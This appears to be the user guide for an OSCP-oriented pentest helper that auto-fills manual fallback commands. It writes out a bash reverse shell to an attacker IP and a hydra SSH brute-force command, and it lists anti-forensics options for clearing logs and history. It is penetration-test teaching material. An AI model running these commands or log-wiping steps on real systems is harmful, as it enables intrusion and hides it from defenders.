# Alternative Commands User Guide

**Version**: 1.0
**Date**: 2025-10-09
**Status**: Production Ready

---

## Overview

**Alternative Commands** provide context-aware manual command alternatives for when automated tools fail in the OSCP exam. Press `alt` in interactive mode to execute manual methods with auto-filled variables.

### Why Alternative Commands?

**The Problem**: Automated tools fail in OSCP exams
- Gobuster crashes or hangs
- Wordlists missing or wrong
- WAF blocks automated scanning
- Network issues prevent tool execution

**The Solution**: Manual alternatives that always work
- curl for manual directory checking
- nc for manual port scanning
- Manual SQL injection testing
- File transfer without tools

---

## Quick Start

### 1. Setup Config (One-Time)

```bash
# Auto-detect your attacking IP
crack reference --config auto

# Or manually set variables
crack reference --set LHOST 192.168.45.200
crack reference --set LPORT 4444

# View current config
crack reference --config list
```

### 2. Launch Interactive Mode

```bash
crack track -i 192.168.45.100
```

### 3. Press 'alt' During Any Task

```
Current Task: Directory Brute-force (Port 80)
Command: gobuster dir -u http://192.168.45.100:80 -w common.txt

Alternative Commands:

  1. Manual Directory Check
     Use curl to manually test common directories

  2. Check robots.txt
     Check robots.txt for disallowed paths

  3. HTTP Headers Inspection
     Manually inspect HTTP headers for clues

Select alternative [1-3]: 1
```

### 4. Variables Auto-Fill

```
Preparing: Manual Directory Check

Auto-filled variables:
  <TARGET> → 192.168.45.100 (from profile)
  <PORT> → 80 (from task metadata)

Enter missing variables:
  <DIRECTORY> → admin

Final command: curl http://192.168.45.100:80/admin

Execute? [Y/n]: y
```

### 5. Command Executes and Logs

```
Executing: curl http://192.168.45.100:80/admin

[Command output appears here]

✓ Execution logged to profile
✓ Output saved with timestamp
```

---

## Key Features

### Config-Aware Auto-Fill

Variables automatically fill from `~/.crack/config.json`:

| Variable | Source | Example |
|----------|--------|---------|
| `<LHOST>` | Config (auto-detected) | 192.168.1.113 |
| `<LPORT>` | Config (default) | 4444 |
| `<TARGET>` | Profile | 192.168.45.100 |
| `<PORT>` | Task metadata | 80 |
| `<SERVICE>` | Task metadata | http |
| `<WORDLIST>` | Context-aware | /usr/share/wordlists/dirb/common.txt |

**Variable Resolution Priority**:
1. **Task Metadata** → Most specific (port, service from current task)
2. **Profile State** → Target-specific (target IP, discovered services)
3. **Config Variables** → User preferences (LHOST, LPORT, wordlists)
4. **User Prompt** → Fallback (for values that can't be auto-detected)

### Context-Aware Wordlist Selection

Different attack phases automatically select appropriate wordlists:

#### Web Enumeration
```python
# gobuster, dirb, dirsearch tasks
Default: /usr/share/wordlists/dirb/common.txt
Thorough: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Quick: /usr/share/wordlists/dirb/small.txt
```

#### Password Cracking
```python
# hydra, medusa, ncrack tasks
Default: /usr/share/wordlists/rockyou.txt
SSH: /usr/share/seclists/Passwords/Common-Credentials/ssh-passwords.txt
FTP: /usr/share/wordlists/metasploit/unix_passwords.txt
HTTP Auth: /usr/share/wordlists/metasploit/http_default_pass.txt
```

#### Parameter Fuzzing
```python
# ffuf, wfuzz tasks
Default: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
SQLi: /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
XSS: /usr/share/seclists/Fuzzing/XSS-Fuzzing.txt
```

#### Subdomain/VHost Enumeration
```python
# wfuzz vhost, sublist3r tasks
Subdomain: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
VHost: /usr/share/seclists/Discovery/DNS/namelist.txt
```

**How it works**: System infers purpose from task ID and metadata
- Task ID: `gobuster-*` → web-enumeration
- Task ID: `hydra-*` → password-cracking
- Service: `http` + purpose=enum → web wordlist
- Service: `ssh` + purpose=password → ssh passwords

### Task-Linked Alternatives

Each task automatically shows relevant alternatives:

**gobuster tasks** → 3 alternatives:
- Manual directory check (curl)
- Check robots.txt
- Check sitemap.xml

**nikto tasks** → 2 alternatives:
- Manual vulnerability testing
- Apache CVE manual checks

**hydra tasks** → 2 alternatives:
- Manual authentication testing
- Service-specific credential testing

**Linking methods**:
1. **Pattern matching**: Task ID matches pattern (e.g., `gobuster-*`)
2. **Service matching**: Task service matches alternative (e.g., `http`)
3. **Tag matching**: Task tags match alternative tags (e.g., `OSCP:HIGH`)

### Pattern-Based Auto-Discovery

Alternatives automatically link to tasks via smart pattern matching:

```python
# Example: gobuster-80 task
Task ID: 'gobuster-80'
  ↓ Pattern match
Matches: 'gobuster-*' → ['alt-manual-dir-check', 'alt-robots-check']
  ↓ Service match
Service: 'http' → ['alt-http-headers-inspect']
  ↓ Tag match
Tags: ['OSCP:HIGH'] → ['alt-manual-dir-check']
  ↓ Deduplicate
Result: ['alt-manual-dir-check', 'alt-robots-check', 'alt-http-headers-inspect']
```

**Performance**: <1ms per task, even with 100+ alternatives

---

## Usage Workflows

### Workflow 1: Web Enumeration

**Scenario**: Gobuster crashes on target web server

```bash
# 1. Launch interactive mode
crack track -i 192.168.45.100

# 2. Navigate to gobuster task
# Press 'alt'

# 3. System shows:
#   - Manual Directory Check
#   - Check robots.txt
#   - HTTP Headers Inspection

# 4. Select "Manual Directory Check"

# 5. Variables auto-fill:
#   <TARGET> → 192.168.45.100
#   <PORT> → 80
#   <WORDLIST> → /usr/share/wordlists/dirb/common.txt

# 6. Enter custom value:
#   <DIRECTORY> → admin

# 7. Execute:
curl http://192.168.45.100:80/admin

# 8. Test more directories manually:
#   /admin, /upload, /backup, /config, /api
```

### Workflow 2: Password Cracking

**Scenario**: Need to brute-force SSH with service-specific wordlist

```bash
# 1. Navigate to SSH task
# Press 'alt'

# 2. System shows:
#   - Hydra SSH Brute-force
#   - Manual SSH Login Testing

# 3. Select "Hydra SSH Brute-force"

# 4. Variables auto-fill:
#   <TARGET> → 192.168.45.100
#   <PORT> → 22
#   <WORDLIST> → /usr/share/seclists/.../ssh-passwords.txt
#                (NOT rockyou.txt - SSH-specific!)

# 5. Enter username:
#   <USERNAME> → admin

# 6. Execute:
hydra -l admin -P /usr/share/seclists/.../ssh-passwords.txt ssh://192.168.45.100

# 7. Try manual login with found password
```

### Workflow 3: Reverse Shell

**Scenario**: Need reverse shell command with correct LHOST

```bash
# 1. Press 'alt' → Browse by category
# 2. Select "Exploitation" category
# 3. Select "Bash Reverse Shell"

# 4. Variables auto-fill from config:
#   <LHOST> → 192.168.1.113 (from ~/.crack/config.json)
#   <LPORT> → 4444 (from config)

# 5. Verify values and execute:
bash -i >& /dev/tcp/192.168.1.113/4444 0>&1

# 6. Copy and paste on target
# 7. Get shell!
```

### Workflow 4: File Transfer

**Scenario**: Need to transfer file without wget/curl

```bash
# 1. Press 'alt' → Browse by category
# 2. Select "File Transfer" category

# 3. Options shown:
#   - Python HTTP Server
#   - Netcat File Transfer
#   - Base64 Encode/Decode
#   - /dev/tcp Transfer

# 4. Select "Python HTTP Server"

# 5. Variables auto-fill:
#   <LHOST> → 192.168.1.113
#   <LPORT> → 8000
#   <DIRECTORY> → Enter: /opt/tools

# 6. Execute on attacker:
python3 -m http.server 8000 -d /opt/tools

# 7. Then use alternative for download:
#   /dev/tcp method or base64 encoding
```

---

## Alternative Command Categories

### 1. Web Enumeration (10+ alternatives)

| Command | Description | Auto-Fill Variables |
|---------|-------------|---------------------|
| Manual Directory Check | curl manual testing | TARGET, PORT, DIRECTORY |
| Check robots.txt | Find disallowed paths | TARGET, PORT |
| Check sitemap.xml | Find documented paths | TARGET, PORT |
| HTTP Headers Inspection | Inspect response headers | TARGET, PORT |
| Source Code Review | View page source manually | TARGET, PORT |
| Cookie Inspection | Examine cookies | TARGET, PORT |
| Form Parameter Testing | Manual form testing | TARGET, PORT |
| API Endpoint Testing | Test API endpoints | TARGET, PORT |
| JavaScript File Inspection | Review JS for paths | TARGET, PORT |
| WSDL/WADL Discovery | Find web service definitions | TARGET, PORT |

**Use when**: Gobuster/dirb/dirsearch fail or hang

### 2. Privilege Escalation (10+ alternatives)

| Command | Description | Auto-Fill Variables |
|---------|-------------|---------------------|
| Find SUID Binaries | Search for SUID files | None |
| Sudo -l Enumeration | Check sudo permissions | None |
| Linux Capabilities | Check file capabilities | None |
| Writable /etc/passwd | Check if /etc/passwd writable | None |
| Cron Jobs Enumeration | Find scheduled tasks | None |
| Kernel Version Check | Check for kernel exploits | None |
| Running Processes | List all processes | None |
| Network Connections | Active connections | None |
| Writable Service Binaries | Find writable services | None |
| NFS no_root_squash | Check NFS exports | None |

**Use when**: LinPEAS/WinPEAS unavailable or blocked

### 3. File Transfer (10+ alternatives)

| Command | Description | Auto-Fill Variables |
|---------|-------------|---------------------|
| Python HTTP Server | Simple file server | LHOST, LPORT, DIRECTORY |
| wget Download | Download file | TARGET, FILE |
| curl Download | Alternative download | TARGET, FILE |
| Netcat File Transfer | Transfer via netcat | LHOST, LPORT, FILE |
| SCP Transfer | Secure copy | TARGET, FILE |
| Base64 Encode/Decode | Text-based transfer | FILE |
| PowerShell Download | Windows download | LHOST, FILE |
| certutil Download | Windows alternative | LHOST, FILE |
| SMB File Transfer | Transfer via SMB | LHOST, FILE |
| /dev/tcp Transfer | Bash-only transfer | LHOST, LPORT, FILE |

**Use when**: Target has no wget/curl or limited internet access

### 4. Anti-Forensics (10+ alternatives)

| Command | Description | Auto-Fill Variables |
|---------|-------------|---------------------|
| Clear Bash History | Remove command history | None |
| Selective History Deletion | Delete specific commands | None |
| Timestamp Manipulation | Change file timestamps | FILE |
| Log File Clearing | Clear system logs | None |
| Windows Event Log Clearing | Clear Windows logs | None |
| PowerShell History Clearing | Clear PS history | None |
| wtmp/utmp Clearing | Clear login records | None |
| lastlog Clearing | Clear last login | None |
| Secure File Deletion | Overwrite file contents | FILE |
| Log File Replacement | Replace logs with clean copy | FILE |

**Use when**: Need to cover tracks during exam (use responsibly!)

### 5. Database Enumeration (10+ alternatives)

| Command | Description | Auto-Fill Variables |
|---------|-------------|---------------------|
| MySQL Version Check | Check MySQL version | TARGET, PORT |
| PostgreSQL Version | Check PostgreSQL version | TARGET, PORT |
| MSSQL Version | Check MSSQL version | TARGET, PORT |
| Database Enumeration | List all databases | TARGET, PORT |
| Table Enumeration | List tables in database | TARGET, PORT, DATABASE |
| User/Password Extraction | Dump credentials | TARGET, PORT, DATABASE |
| Privilege Checking | Check user privileges | TARGET, PORT |
| UDF Exploitation | User-defined function exploit | TARGET, PORT |
| xp_cmdshell Execution | MSSQL command execution | TARGET, PORT, COMMAND |
| NoSQL Enumeration | MongoDB/Redis enum | TARGET, PORT |

**Use when**: SQLmap fails or too noisy

### 6. Network Reconnaissance (10+ alternatives)

| Command | Description | Auto-Fill Variables |
|---------|-------------|---------------------|
| Netcat Port Check | Manual port scanning | TARGET, PORT |
| Banner Grabbing | Grab service banners | TARGET, PORT |
| /dev/tcp Port Check | Bash-only port check | TARGET, PORT |
| telnet Port Check | Alternative port check | TARGET, PORT |
| Ping Sweep | Find live hosts | TARGET_RANGE |
| ARP Scan | Local network discovery | INTERFACE |
| DNS Enumeration | DNS record lookup | DOMAIN |
| WHOIS Lookup | Domain registration info | DOMAIN |
| traceroute | Path discovery | TARGET |
| Interface Enumeration | List network interfaces | None |

**Use when**: Nmap unavailable or blocked by firewall

---

## Configuration Guide

### Auto-Detect Config

```bash
# One-time setup
crack reference --config auto

# This auto-detects:
# - LHOST: Your active network interface IP
# - LPORT: Default 4444
# - WORDLIST: Default /usr/share/wordlists/dirb/common.txt
```

### Manual Config Setup

```bash
# Set LHOST (your attacking IP)
crack reference --set LHOST 192.168.45.200

# Set LPORT (your listener port)
crack reference --set LPORT 4444

# Set default wordlist
crack reference --set WORDLIST /usr/share/wordlists/dirb/common.txt

# Set custom variable
crack reference --set CUSTOM_VAR value
```

### View Config

```bash
# List all config variables
crack reference --config list

# Output:
# LHOST: 192.168.45.200 (manual)
# LPORT: 4444 (default)
# WORDLIST: /usr/share/wordlists/dirb/common.txt (manual)

# Get specific variable
crack reference --get LHOST

# Edit config file directly
crack reference --config edit
# Opens ~/.crack/config.json in $EDITOR
```

### Config File Format

```json
{
  "variables": {
    "LHOST": {
      "value": "192.168.45.200",
      "source": "manual",
      "description": "Local/attacker IP address"
    },
    "LPORT": {
      "value": "4444",
      "source": "default",
      "description": "Local listening port"
    },
    "WORDLIST": {
      "value": "/usr/share/wordlists/dirb/common.txt",
      "source": "manual",
      "description": "Default wordlist for enumeration"
    }
  }
}
```

**Location**: `~/.crack/config.json`

---

## Common Scenarios

### Scenario: Tool Not Available

**Problem**: Gobuster not installed on exam VM

**Solution**:
1. Press `alt` during gobuster task
2. Select "Manual Directory Check"
3. Use curl to test common directories
4. System auto-fills TARGET and PORT
5. Enter directories manually: admin, upload, backup

### Scenario: Wrong Wordlist

**Problem**: Using rockyou.txt for web directory enumeration (too large!)

**Solution**:
1. System automatically selects dirb/common.txt for web enum
2. Context inference from task type (gobuster = web-enumeration)
3. Service-specific selection (http = web wordlist)
4. User can override by entering custom wordlist path

### Scenario: Missing Config Variable

**Problem**: LHOST not set in config

**Solution**:
1. System prompts: "Enter value for <LHOST>:"
2. User enters attacking IP
3. Value used for this command only (not saved)
4. OR: Run `crack reference --config auto` to detect

### Scenario: Network Interface Changed

**Problem**: LHOST in config is old IP from previous network

**Solution**:
```bash
# Re-detect network settings
crack reference --config auto

# Or manually update
crack reference --set LHOST auto
```

### Scenario: Need Different Wordlist

**Problem**: Default wordlist too small, need thorough scan

**Solution**:
1. Press `alt` → Select alternative
2. When prompted for WORDLIST:
3. Enter: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
4. System uses custom wordlist instead of default

### Scenario: Multiple Targets

**Problem**: Need to test same command on multiple targets

**Solution**:
1. Press `alt` → Select alternative
2. Variables auto-fill for current target
3. Execute and log to profile
4. Switch to different target: `crack track -i 192.168.45.101`
5. Repeat - variables auto-fill for new target

---

## Tips and Tricks

### 1. Quick Config Setup

```bash
# One-command setup for OSCP lab
crack reference --config auto && \
crack reference --set LPORT 4444 && \
crack reference --set WORDLIST /usr/share/wordlists/dirb/common.txt
```

### 2. Verify Config Before Exam

```bash
# Check all variables are set
crack reference --config list

# Expected:
# ✓ LHOST: 192.168.45.200
# ✓ LPORT: 4444
# ✓ WORDLIST: /usr/share/wordlists/dirb/common.txt
```

### 3. Test Alternative Before Exam

```bash
# In practice lab, test alternatives work:
crack track -i LAB_TARGET

# Navigate to task
# Press 'alt'
# Execute alternative
# Verify output logs correctly
```

### 4. Memorize Common Alternatives

**Web enum**: curl, robots.txt, headers
**Privesc**: SUID, sudo -l, capabilities
**File transfer**: python http.server, base64, nc
**Recon**: nc -zv, /dev/tcp, banner grab

### 5. Alternative Shortcut Combos

```
alt + 1 = First alternative (usually manual method)
alt + 2 = Second alternative (usually quick check)
alt + 3 = Third alternative (usually headers/info)
```

### 6. Save Working Commands

When an alternative works well:
```bash
# Note it in profile
crack track note TARGET "Manual dir check with curl worked great on /admin"

# Later review successful methods
crack track show TARGET
```

---

## Troubleshooting

### Issue: Variables Not Auto-Filling

**Symptoms**: All variables prompt for input

**Solution**:
1. Check config exists: `cat ~/.crack/config.json`
2. If missing, run: `crack reference --config auto`
3. Verify variables: `crack reference --config list`

### Issue: Wrong Wordlist Selected

**Symptoms**: Password wordlist used for web enum

**Solution**:
1. Check task metadata has correct service type
2. Verify purpose is inferred correctly
3. Override by entering custom wordlist path when prompted

### Issue: LHOST Shows Wrong IP

**Symptoms**: LHOST shows old network IP

**Solution**:
```bash
# Re-detect network settings
crack reference --set LHOST auto

# Or manually set
crack reference --set LHOST 192.168.45.200
```

### Issue: Alternative Not Showing for Task

**Symptoms**: Press 'alt' but no alternatives shown

**Solution**:
1. Check task has service metadata
2. Verify alternative exists for that service
3. Try browsing by category instead
4. Check registry loaded: Look for "Loaded X alternatives" in logs

### Issue: Execution Fails

**Symptoms**: Command fails after auto-fill

**Solution**:
1. Review filled command before confirming
2. Check TARGET/PORT values are correct
3. Test manually first: copy command and run in terminal
4. Check network connectivity to target

---

## Developer Guide

Want to add your own alternative commands?

### Quick Start

```bash
# 1. Copy template
cp crack/track/alternatives/commands/TEMPLATE.py my_alternatives.py

# 2. Edit alternative definition
# 3. Add to category file
# 4. Test
crack track -i TEST_TARGET
# Press 'alt' → Your command appears
```

**Full guide**: `crack/track/alternatives/commands/README.md`

---

## Support

### Documentation

- **This guide**: User documentation
- **Developer guide**: `alternatives/commands/README.md`
- **Implementation summary**: `docs/ALTERNATIVE_COMMANDS_IMPLEMENTATION_SUMMARY.md`
- **Completion report**: `docs/PHASE_5_6_COMPLETION_REPORT.md`

### Getting Help

1. **Check test examples**: `tests/track/alternatives/` - Real working examples
2. **Review TEMPLATE.py**: `alternatives/commands/TEMPLATE.py` - Copy-paste patterns
3. **Read execution checklist**: `docs/PHASE_5_6_EXECUTION_CHECKLIST.md` - Implementation details

---

## Appendix: Variable Reference

### Common Variables

| Variable | Description | Auto-Fill Source | Example |
|----------|-------------|------------------|---------|
| `<TARGET>` | Target IP/hostname | Profile | 192.168.45.100 |
| `<PORT>` | Target port | Task metadata | 80 |
| `<SERVICE>` | Service type | Task metadata | http |
| `<LHOST>` | Attacker IP | Config | 192.168.1.113 |
| `<LPORT>` | Listener port | Config | 4444 |
| `<WORDLIST>` | Path to wordlist | Context-aware | /usr/share/wordlists/... |
| `<USERNAME>` | Username | User prompt | admin |
| `<PASSWORD>` | Password | User prompt | password123 |
| `<DIRECTORY>` | Directory path | User prompt | /admin |
| `<FILE>` | Filename | User prompt | exploit.sh |
| `<DATABASE>` | Database name | User prompt | mysql |
| `<COMMAND>` | Command to execute | User prompt | whoami |
| `<DOMAIN>` | Domain name | User prompt | example.com |
| `<INTERFACE>` | Network interface | User prompt | tun0 |
| `<OUTPUT>` | Output file path | User prompt | scan.txt |

### Variable Naming Convention

- **All caps with angle brackets**: `<VARIABLE>`
- **Descriptive names**: `<TARGET>` not `<T>`
- **Consistent across commands**: Use same name for same purpose
- **Auto-resolve when possible**: Use common names that can be filled from context

---

## License

Part of CRACK Track - Comprehensive Recon & Attack Creation Kit

**License**: MIT
**Maintained by**: OSCP students, for OSCP students

---

**Status**: Production Ready ✅
**Version**: 1.0
**Last Updated**: 2025-10-09
